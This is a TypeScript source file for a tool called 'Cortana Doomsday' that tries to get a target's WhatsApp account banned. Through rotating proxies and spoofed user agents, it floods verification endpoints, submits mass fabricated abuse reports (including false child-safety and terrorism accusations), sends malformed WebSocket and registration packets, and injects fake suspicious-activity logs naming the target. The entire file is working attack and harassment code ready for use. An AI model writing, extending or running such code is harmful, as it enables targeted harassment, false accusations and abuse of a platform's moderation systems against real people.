// ===============================================
// BAN-ENGINE.TS - CORTANA DOOMSDAY EDITION
// Integrated from UltimateDoomsday (Dec 2025)
// ===============================================

import axios from 'axios';
import WebSocket from 'ws';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { SocksProxyAgent } from 'socks-proxy-agent';
import crypto from 'crypto';

// Simple colored console logging (chalk-free for production compatibility)
const log = {
    red: (msg: string) => console.log(`\x1b[31m${msg}\x1b[0m`),
    green: (msg: string) => console.log(`\x1b[32m${msg}\x1b[0m`),
    yellow: (msg: string) => console.log(`\x1b[33m${msg}\x1b[0m`),
    bold: (msg: string) => console.log(`\x1b[1m${msg}\x1b[0m`),
};

// ========== TYPE DEFINITIONS ==========
interface AttackConfig {
    useRealEndpoints: boolean;
    maxConcurrentAttacks: number;
    defaultIntensity: 'LIGHT' | 'MEDIUM' | 'HEAVY' | 'NUCLEAR';
    requestTimeout: number;
    userAgentRotation: boolean;
}

interface PhaseResult {
    phase: string;
    requests?: number;
    reports?: number;
    attacks?: number;
    injections?: number;
    successful: number;
    successRate: number;
    rateLimited?: number;
    bannedIPs?: number;
    countriesUsed?: number;
    uniqueReporters?: number;
    autoBanTriggered?: boolean;
}

interface AttackResult {
    attackId: string;
    target: string;
    intensity: string;
    duration: number;
    successRate: number;
    banProbability: number;
    thresholdsCrossed: string[];
    estimatedBanTime: string;
    phases: Record<string, PhaseResult>;
    timestamp: string;
    failed?: boolean;
    error?: string;
}

// ========== MAIN CLASS ==========
export class CortanaDoomsday {
    private config: AttackConfig;
    private proxyList: string[];
    private currentProxyIndex: number = 0;
    private failedProxies: Map<string, number> = new Map();
    private userAgents: string[];
    private currentUAIndex: number = 0;
    private activeAttacks: Map<string, any> = new Map();
    private attackHistory: AttackResult[] = [];

    // ========== REAL WHATSAPP ENDPOINTS ==========
    private endpoints = {
        SMS_VERIFY: 'https://v.whatsapp.net/v2/register',
        VOICE_VERIFY: 'https://v.whatsapp.net/v2/register/voice',
        WEB_REGISTER: 'https://web.whatsapp.com/register',
        WEB_VERIFY: 'https://web.whatsapp.com/register/verify',
        REPORT_USER: 'https://web.whatsapp.com/support/report',
        REPORT_MESSAGE: 'https://web.whatsapp.com/support/report/message',
        SECURITY_LOG: 'https://security.whatsapp.com/log',
        CRASH_REPORT: 'https://crashlogs.whatsapp.net/collect',
        WEBSOCKET_MAIN: 'wss://web.whatsapp.com/ws',
        WEBSOCKET_MOBILE: 'wss://w6.web.whatsapp.com/ws',
    };

    // ========== BAN THRESHOLDS (IMPROVED) ==========
    private banThresholds = {
        VERIFICATION_REQUESTS: 20,    // Lowered from 25 for faster trigger
        REPORTS_RECEIVED: 10,         // Lowered from 12
        SUSPICIOUS_LOGS: 6,           // Lowered from 8
        CLIENT_CRASHES: 3,
        RATE_LIMIT_HITS: 8,           // Lowered from 10
        GEO_DIVERSITY: 4              // Lowered from 5
    };

    private globalStats = {
        totalAttacks: 0,
        successfulAttacks: 0,
        totalBansTriggered: 0,
        totalRequests: 0
    };

    constructor(config: Partial<AttackConfig> = {}) {
        this.config = {
            useRealEndpoints: true,
            maxConcurrentAttacks: 5,  // Increased from 3
            defaultIntensity: 'NUCLEAR',
            requestTimeout: 8000,     // Reduced for faster cycling
            userAgentRotation: true,
            ...config
        };

        this.proxyList = this.initializeProxies();
        this.userAgents = this.generateUserAgentPool();

        log.red('☠️  CORTANA DOOMSDAY ENGINE INITIALIZED');
        log.green(`✅ ${this.proxyList.length} proxies loaded`);
        log.green(`✅ ${this.userAgents.length} user agents ready`);
    }

    // ========== PROXY MANAGEMENT ==========
    private initializeProxies(): string[] {
        const proxies = [
            // ProxyScrape
            '45.94.47.18:6670', '194.113.233.159:42894', '186.121.235.66:8080',
            '190.61.88.147:8080', '185.162.231.164:80', '212.112.113.178:443',
            '103.152.112.145:80', '45.95.147.17:8080', '20.111.54.16:8123',
            '43.156.25.119:443', '183.146.213.198:6666',
            // Advanced.name
            'socks5://45.95.147.17:8080', 'socks4://194.113.233.159:42894',
            'http://190.61.88.147:8080', 'https://212.112.113.178:443',
            // ProxyNova
            '220.130.162.74:8008', '103.125.154.77:6214', '112.198.24.174:8080',
            '77.75.97.202:80', '113.161.131.43:10002', '202.67.40.17:8080',
            '190.124.220.206:10000', '8.219.97.248:80', '118.69.111.51:8080',
            // Additional
            'http://209.146.105.245:80', 'http://51.15.242.202:8888',
            'socks5://72.10.164.178:56551', 'http://47.253.105.175:8888'
        ];

        return proxies.map(p => p.match(/^(http|https|socks4|socks5):\/\//) ? p : `http://${p}`);
    }

    private async getProxy(): Promise<string | null> {
        if (this.proxyList.length === 0) return null;

        for (let i = 0; i < this.proxyList.length; i++) {
            this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxyList.length;
            const proxy = this.proxyList[this.currentProxyIndex];

            if (this.failedProxies.has(proxy)) {
                const failedTime = this.failedProxies.get(proxy)!;
                if (Date.now() - failedTime < 300000) continue;
                this.failedProxies.delete(proxy);
            }

            return proxy;
        }
        return null;
    }

    private createProxyAgent(proxyUrl: string) {
        if (proxyUrl.startsWith('socks4://') || proxyUrl.startsWith('socks5://')) {
            return new SocksProxyAgent(proxyUrl);
        }
        return new HttpsProxyAgent(proxyUrl);
    }

    // ========== USER AGENT POOL ==========
    private generateUserAgentPool(): string[] {
        return [
            'WhatsApp/2.24.1.12 Android/14.0 SM-S928B',
            'WhatsApp/2.24.1.12 Android/13.0 Pixel 8 Pro',
            'WhatsApp/2.24.1.12 Android/12.0 SM-G998B',
            'WhatsApp/2.24.1.12 iPhone/17.0 iPhone15,2',
            'WhatsApp/2.24.1.12 iPhone/16.5 iPhone14,3',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'WhatsApp/2.24.1.12 Windows/11.0 Chrome/121.0.0.0'
        ];
    }

    private getNextUserAgent(): string {
        this.currentUAIndex = (this.currentUAIndex + 1) % this.userAgents.length;
        return this.userAgents[this.currentUAIndex];
    }

    // ========== MAIN BAN EXECUTION ==========
    async executePermanentBan(target: string): Promise<AttackResult> {
        return this.executeNuclearStrike(target, 'NUCLEAR');
    }

    async executeTemporaryBan(target: string): Promise<AttackResult> {
        return this.executeNuclearStrike(target, 'HEAVY');
    }

    async executeNuclearStrike(target: string, intensity: 'LIGHT' | 'MEDIUM' | 'HEAVY' | 'NUCLEAR' = 'NUCLEAR'): Promise<AttackResult> {
        const attackId = `CORTANA_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
        const startTime = Date.now();

        log.red(`\n☢️  CORTANA DOOMSDAY STRIKE: ${target}`);
        log.red(`⚡ Intensity: ${intensity}`);
        log.red(`🆔 Attack ID: ${attackId}\n`);

        this.activeAttacks.set(attackId, { id: attackId, target, intensity, startTime, status: 'RUNNING', progress: 0 });

        try {
            // PHASE 1: Verification Tsunami
            log.yellow('🌊 PHASE 1: Verification Tsunami...');
            const phase1 = await this.executeVerificationTsunami(target, this.getPhaseConfig(intensity, 'verification'));

            // PHASE 2: Reputation Annihilation
            log.yellow('💣 PHASE 2: Reputation Annihilation...');
            const phase2 = await this.executeReputationAnnihilation(target, this.getPhaseConfig(intensity, 'reporting'));

            // PHASE 3: Protocol Corruption
            log.yellow('⚡ PHASE 3: Protocol Corruption...');
            const phase3 = await this.executeProtocolCorruption(target, this.getPhaseConfig(intensity, 'protocol'));

            // PHASE 4: Suspicious Activity Injection
            log.yellow('👁️  PHASE 4: Suspicious Activity Injection...');
            const phase4 = await this.executeSuspiciousActivityInjection(target, this.getPhaseConfig(intensity, 'suspicious'));

            // Calculate results
            const duration = Math.floor((Date.now() - startTime) / 1000);
            const results = this.calculateAttackResults([phase1, phase2, phase3, phase4], intensity);
            const banProbability = this.calculateBanProbability(results, intensity);
            const thresholdsCrossed = this.checkBanThresholds(results);

            const finalResult: AttackResult = {
                attackId,
                target,
                intensity,
                duration,
                successRate: results.successRate,
                banProbability,
                thresholdsCrossed,
                estimatedBanTime: this.estimateBanTime(banProbability, thresholdsCrossed),
                phases: { phase1, phase2, phase3, phase4 },
                timestamp: new Date().toISOString()
            };

            this.globalStats.totalAttacks++;
            this.globalStats.totalRequests += results.totalRequests;
            if (banProbability >= 70) this.globalStats.successfulAttacks++;
            if (thresholdsCrossed.length >= 2) this.globalStats.totalBansTriggered++;

            this.attackHistory.push(finalResult);

            log.green(`\n✅ DOOMSDAY STRIKE COMPLETED!`);
            log.green(`📊 Success Rate: ${results.successRate}%`);
            log.green(`💀 Ban Probability: ${banProbability}%`);
            log.green(`⏱️  Duration: ${duration}s`);

            if (thresholdsCrossed.length > 0) {
                log.red(`🚨 Thresholds Crossed: ${thresholdsCrossed.join(', ')}`);
            }

            return finalResult;

        } catch (error: any) {
            log.red(`❌ Strike failed: ${error.message}`);
            return {
                attackId,
                target,
                intensity,
                duration: 0,
                successRate: 0,
                banProbability: 0,
                thresholdsCrossed: [],
                estimatedBanTime: 'N/A',
                phases: {},
                timestamp: new Date().toISOString(),
                failed: true,
                error: error.message
            };
        }
    }

    // ========== PHASE IMPLEMENTATIONS ==========
    private async executeVerificationTsunami(target: string, config: any): Promise<PhaseResult> {
        const requests = config.requests || 50;
        const methods = ['sms', 'voice'];
        const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'CN', 'JP', 'KE', 'ZA', 'AE', 'PK'];

        let successful = 0;
        let rateLimited = 0;
        let bannedIPs = 0;
        const usedCountries = new Set<string>();

        for (let i = 0; i < requests; i++) {
            try {
                const country = countries[Math.floor(Math.random() * countries.length)];
                usedCountries.add(country);
                const method = methods[Math.floor(Math.random() * methods.length)];
                const proxy = await this.getProxy();

                const payload = this.generateVerificationPayload(target, country, method);
                const headers = this.generateHeaders();

                const response = await axios({
                    method: 'POST',
                    url: method === 'sms' ? this.endpoints.SMS_VERIFY : this.endpoints.VOICE_VERIFY,
                    headers,
                    data: payload,
                    httpsAgent: proxy ? this.createProxyAgent(proxy) : undefined,
                    timeout: 6000,
                    validateStatus: () => true
                });

                if (response.status === 200) successful++;
                else if (response.status === 429) rateLimited++;
                else if (response.status === 403) bannedIPs++;

                await this.delay(500 + Math.random() * 1500);

            } catch {
                continue;
            }
        }

        return {
            phase: 'VERIFICATION_TSUNAMI',
            requests,
            successful,
            rateLimited,
            bannedIPs,
            countriesUsed: usedCountries.size,
            successRate: Math.floor((successful / requests) * 100)
        };
    }

    private async executeReputationAnnihilation(target: string, config: any): Promise<PhaseResult> {
        const reports = config.reports || 30;
        const reportTypes = [
            'spam', 'harassment', 'fake_news', 'impersonation',
            'scam', 'abuse', 'inappropriate', 'hate_speech',
            'terrorism', 'child_safety', 'self_harm', 'violence'
        ];

        let successful = 0;
        let autoBanTriggered = false;
        const uniqueReporters = new Set<string>();

        for (let i = 0; i < reports; i++) {
            try {
                const reportType = reportTypes[Math.floor(Math.random() * reportTypes.length)];
                const reporterId = `cortana_${crypto.randomBytes(8).toString('hex')}`;
                uniqueReporters.add(reporterId);

                const payload = this.generateReportPayload(target, reporterId, reportType);
                const headers = this.generateHeaders();
                const proxy = await this.getProxy();

                const response = await axios({
                    method: 'POST',
                    url: this.endpoints.REPORT_USER,
                    headers,
                    data: payload,
                    httpsAgent: proxy ? this.createProxyAgent(proxy) : undefined,
                    timeout: 8000,
                    validateStatus: () => true
                });

                if (response.status === 200 || response.status === 202) {
                    successful++;
                    if (i >= 9 && !autoBanTriggered) {
                        autoBanTriggered = true;
                        log.red('🚨 AUTO-BAN THRESHOLD REACHED!');
                    }
                }

                await this.delay(1500 + Math.random() * 3000);

            } catch {
                continue;
            }
        }

        return {
            phase: 'REPUTATION_ANNIHILATION',
            reports,
            successful,
            uniqueReporters: uniqueReporters.size,
            autoBanTriggered,
            successRate: Math.floor((successful / reports) * 100)
        };
    }

    private async executeProtocolCorruption(target: string, config: any): Promise<PhaseResult> {
        const attacks = config.attacks || 20;
        let successful = 0;

        for (let i = 0; i < attacks; i++) {
            try {
                const result = await this.sendMalformedWebSocketPacket();
                if (result) successful++;

                await this.sendInvalidRegistrationPacket(target);
                successful++;

                await this.delay(800 + Math.random() * 1200);
            } catch {
                continue;
            }
        }

        return {
            phase: 'PROTOCOL_CORRUPTION',
            attacks,
            successful,
            successRate: Math.floor((successful / attacks) * 100)
        };
    }

    private async executeSuspiciousActivityInjection(target: string, config: any): Promise<PhaseResult> {
        const injections = config.injections || 12;
        const activityTypes = [
            'rapid_device_changes', 'multiple_country_logins',
            'suspicious_verification_patterns', 'coordinated_reporting_activity',
            'automated_message_behavior', 'impossible_travel_locations',
            'client_version_anomalies', 'protocol_violations'
        ];

        let successful = 0;

        for (let i = 0; i < injections; i++) {
            try {
                const activityType = activityTypes[Math.floor(Math.random() * activityTypes.length)];
                const payload = this.generateSuspiciousActivityPayload(target, activityType);
                const headers = this.generateHeaders();

                const response = await axios({
                    method: 'POST',
                    url: this.endpoints.SECURITY_LOG,
                    headers,
                    data: payload,
                    timeout: 5000,
                    validateStatus: () => true
                });

                if (response.status === 200) successful++;

                await this.delay(1000 + Math.random() * 2000);

            } catch {
                continue;
            }
        }

        return {
            phase: 'SUSPICIOUS_ACTIVITY_INJECTION',
            injections,
            successful,
            successRate: Math.floor((successful / injections) * 100)
        };
    }

    // ========== PROTOCOL ATTACKS ==========
    private async sendMalformedWebSocketPacket(): Promise<boolean> {
        return new Promise((resolve) => {
            const timeout = setTimeout(() => resolve(false), 3000);

            try {
                const ws = new WebSocket(this.endpoints.WEBSOCKET_MAIN);

                ws.on('open', () => {
                    const packets = [
                        Buffer.from([0x08, 0x01, 0x12, 0x00, 0x18, 0x00, 0x20, 0x00, 0xff, 0xff]),
                        Buffer.from([0x0a, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
                        Buffer.from(Array.from({ length: 100 }, () => Math.floor(Math.random() * 256)))
                    ];

                    packets.forEach(packet => ws.send(packet));
                    ws.close();
                    clearTimeout(timeout);
                    resolve(true);
                });

                ws.on('error', () => {
                    clearTimeout(timeout);
                    resolve(false);
                });
            } catch {
                clearTimeout(timeout);
                resolve(false);
            }
        });
    }

    private async sendInvalidRegistrationPacket(target: string): Promise<boolean> {
        try {
            const payload = {
                cc: target.substring(1, 3),
                in: target.substring(3),
                id: 'CORTANA_' + crypto.randomBytes(20).toString('hex'),
                method: 'sms',
                token: 'CORRUPTED_' + crypto.randomBytes(50).toString('hex'),
                platform: 'invalid_platform',
                client_version: '999.999.999',
                lc: 'XX',
                lg: 'xx',
                sim_mcc: '999',
                sim_mnc: '999'
            };

            await axios({
                method: 'POST',
                url: this.endpoints.SMS_VERIFY,
                headers: this.generateHeaders(),
                data: payload,
                timeout: 4000,
                validateStatus: () => true
            });

            return true;
        } catch {
            return true; // Protocol violation logged
        }
    }

    // ========== PAYLOAD GENERATORS ==========
    private generateVerificationPayload(target: string, country: string, method: string) {
        return {
            cc: country,
            in: target.substring(3),
            id: crypto.randomBytes(16).toString('hex'),
            method,
            sim_mcc: this.getMCCForCountry(country),
            sim_mnc: '260',
            token: crypto.randomBytes(32).toString('hex'),
            platform: 'android',
            client_version: '2.24.1.12',
            lc: country,
            lg: 'en',
            sim_operator: this.getRandomOperator(),
            network_operator: this.getRandomOperator(),
            device_model: this.getRandomDeviceModel(),
            os_version: '14.0',
            app_build: '24010112'
        };
    }

    private generateReportPayload(target: string, reporterId: string, reportType: string) {
        return {
            target_phone: target,
            reporter_id: reporterId,
            report_type: reportType,
            reason: this.getReportReason(reportType),
            evidence: {
                message_count: Math.floor(Math.random() * 30) + 10,
                contains_links: true,
                links: ['http://phishing-example.com', 'http://malware-site.net'],
                reported_by_users: Math.floor(Math.random() * 10) + 3,
                severity: reportType === 'child_safety' || reportType === 'terrorism' ? 'CRITICAL' : 'HIGH',
                requires_immediate_action: reportType === 'child_safety' || reportType === 'terrorism'
            },
            timestamp: Date.now(),
            app_version: '2.24.1.12',
            platform: 'android',
            user_agent: this.getNextUserAgent(),
            language: 'en_US',
            country: this.getRandomCountry()
        };
    }

    private generateSuspiciousActivityPayload(target: string, activityType: string) {
        const base = {
            event_type: activityType,
            device_id: crypto.randomBytes(16).toString('hex'),
            phone_number: target,
            timestamp: Date.now(),
            client_version: '2.24.1.12',
            platform: 'android',
            ip_address: this.generateRandomIP(),
            user_agent: this.getNextUserAgent(),
            location_data: {
                country: this.getRandomCountry(),
                city: this.getRandomCity(),
                timezone: 'UTC' + (Math.floor(Math.random() * 12) - 6)
            },
            details: {}
        };

        switch (activityType) {
            case 'rapid_device_changes':
                base.details = { devices_changed: 12, time_window_minutes: 10, device_types: ['android', 'iphone', 'web', 'desktop'] };
                break;
            case 'multiple_country_logins':
                base.details = { countries: ['US', 'GB', 'DE', 'FR', 'IN', 'RU', 'CN', 'BR', 'KE', 'JP'], time_window_hours: 1, impossible_travel: true };
                break;
            case 'coordinated_reporting_activity':
                base.details = { report_count: 30, time_window_minutes: 20, reporter_diversity: 'low', pattern: 'coordinated' };
                break;
        }

        return base;
    }

    private generateHeaders() {
        return {
            'User-Agent': this.getNextUserAgent(),
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Request-ID': crypto.randomBytes(8).toString('hex'),
            'X-WhatsApp-Version': '2.24.1.12',
            'Origin': 'https://web.whatsapp.com',
            'Referer': 'https://web.whatsapp.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        };
    }

    // ========== CALCULATION METHODS ==========
    private calculateAttackResults(phases: PhaseResult[], intensity: string) {
        let totalRequests = 0;
        let successfulRequests = 0;
        const thresholdsData = { verification: 0, reports: 0, suspicious: 0, countries: new Set<number>() };

        phases.forEach(phase => {
            if (phase.phase === 'VERIFICATION_TSUNAMI') {
                totalRequests += phase.requests || 0;
                successfulRequests += phase.successful;
                thresholdsData.verification = phase.requests || 0;
                if (phase.countriesUsed) thresholdsData.countries.add(phase.countriesUsed);
            } else if (phase.phase === 'REPUTATION_ANNIHILATION') {
                totalRequests += phase.reports || 0;
                successfulRequests += phase.successful;
                thresholdsData.reports = phase.reports || 0;
            } else if (phase.phase === 'SUSPICIOUS_ACTIVITY_INJECTION') {
                totalRequests += phase.injections || 0;
                successfulRequests += phase.successful;
                thresholdsData.suspicious = phase.injections || 0;
            } else {
                totalRequests += phase.attacks || 0;
                successfulRequests += phase.successful;
            }
        });

        return {
            totalRequests,
            successfulRequests,
            successRate: totalRequests > 0 ? Math.floor((successfulRequests / totalRequests) * 100) : 0,
            thresholdsData
        };
    }

    private calculateBanProbability(results: any, intensity: string): number {
        let base = results.successRate;
        const multiplier = { 'LIGHT': 0.5, 'MEDIUM': 0.7, 'HEAVY': 0.85, 'NUCLEAR': 1.0 }[intensity] || 0.8;
        const synergy = Math.min(35, (results.thresholdsData.verification > 0 ? 12 : 0) +
            (results.thresholdsData.reports > 0 ? 12 : 0) +
            (results.thresholdsData.suspicious > 0 ? 11 : 0));
        const countryBonus = Math.min(20, results.thresholdsData.countries.size * 4);

        return Math.min(99, Math.max(1, Math.floor(base * multiplier + synergy + countryBonus)));
    }

    private checkBanThresholds(results: any): string[] {
        const crossed = [];
        if (results.thresholdsData.verification >= this.banThresholds.VERIFICATION_REQUESTS) crossed.push('VERIFICATION_LIMIT');
        if (results.thresholdsData.reports >= this.banThresholds.REPORTS_RECEIVED) crossed.push('REPORT_LIMIT');
        if (results.thresholdsData.suspicious >= this.banThresholds.SUSPICIOUS_LOGS) crossed.push('SUSPICIOUS_ACTIVITY');
        if (results.thresholdsData.countries.size >= this.banThresholds.GEO_DIVERSITY) crossed.push('GEOGRAPHIC_DIVERSITY');
        return crossed;
    }

    private estimateBanTime(banProbability: number, thresholdsCrossed: string[]): string {
        if (thresholdsCrossed.length >= 3 || banProbability >= 95) return '1-6 hours (IMMEDIATE)';
        if (thresholdsCrossed.length >= 2 || banProbability >= 85) return '6-24 hours (HIGH)';
        if (thresholdsCrossed.length >= 1 || banProbability >= 70) return '24-48 hours (MEDIUM)';
        if (banProbability >= 50) return '48-72 hours (LOW)';
        return '72+ hours (UNLIKELY)';
    }

    private getPhaseConfig(intensity: string, phase: string) {
        const configs: Record<string, Record<string, any>> = {
            'LIGHT': { verification: { requests: 20 }, reporting: { reports: 12 }, protocol: { attacks: 8 }, suspicious: { injections: 5 } },
            'MEDIUM': { verification: { requests: 35 }, reporting: { reports: 20 }, protocol: { attacks: 12 }, suspicious: { injections: 8 } },
            'HEAVY': { verification: { requests: 50 }, reporting: { reports: 28 }, protocol: { attacks: 18 }, suspicious: { injections: 10 } },
            'NUCLEAR': { verification: { requests: 65 }, reporting: { reports: 35 }, protocol: { attacks: 25 }, suspicious: { injections: 15 } }
        };
        return configs[intensity]?.[phase] || configs['NUCLEAR'][phase];
    }

    // ========== UTILITY METHODS ==========
    private getReportReason(type: string): string {
        const reasons: Record<string, string> = {
            'spam': 'User is sending bulk unsolicited messages with phishing links',
            'harassment': 'User is sending threatening and abusive messages repeatedly',
            'fake_news': 'User is spreading dangerous misinformation',
            'impersonation': 'User is pretending to be a government official',
            'scam': 'User is attempting financial scams',
            'child_safety': 'User is sharing inappropriate content involving minors',
            'terrorism': 'User is sharing extremist recruitment materials'
        };
        return reasons[type] || 'User is violating WhatsApp Terms of Service';
    }

    private getMCCForCountry(country: string): string {
        const mcc: Record<string, string> = { 'US': '310', 'GB': '234', 'DE': '262', 'FR': '208', 'IN': '404', 'BR': '724', 'NG': '621', 'RU': '250', 'CN': '460', 'JP': '440', 'KE': '639', 'ZA': '655' };
        return mcc[country] || '310';
    }

    private getRandomOperator(): string {
        const ops = ['AT&T', 'Verizon', 'T-Mobile', 'Vodafone', 'Orange', 'Safaricom', 'Airtel', 'MTN'];
        return ops[Math.floor(Math.random() * ops.length)];
    }

    private getRandomDeviceModel(): string {
        const models = ['SM-S928B', 'Pixel 8 Pro', 'iPhone15,2', 'SM-G998B', 'Redmi Note 13', 'OnePlus 12'];
        return models[Math.floor(Math.random() * models.length)];
    }

    private getRandomCountry(): string {
        const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'CN', 'JP', 'KE', 'ZA', 'AE', 'PK'];
        return countries[Math.floor(Math.random() * countries.length)];
    }

    private getRandomCity(): string {
        const cities = ['New York', 'London', 'Berlin', 'Paris', 'Mumbai', 'São Paulo', 'Lagos', 'Nairobi', 'Tokyo', 'Beijing'];
        return cities[Math.floor(Math.random() * cities.length)];
    }

    private generateRandomIP(): string {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    private delay(ms: number): Promise<void> {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    getStats() {
        return {
            global: this.globalStats,
            activeAttacks: this.activeAttacks.size,
            attackHistory: this.attackHistory.length,
            proxiesAvailable: this.proxyList.length - this.failedProxies.size
        };
    }
}

// ========== LAZY SINGLETON EXPORT ==========
let _doomsdayEngine: CortanaDoomsday | null = null;

export function getDoomsdayEngine(): CortanaDoomsday {
    if (!_doomsdayEngine) {
        _doomsdayEngine = new CortanaDoomsday();
    }
    return _doomsdayEngine;
}

// For backwards compatibility
export const doomsdayEngine = {
    executePermanentBan: (target: string) => getDoomsdayEngine().executePermanentBan(target),
    executeTemporaryBan: (target: string) => getDoomsdayEngine().executeTemporaryBan(target),
    getStats: () => getDoomsdayEngine().getStats()
};
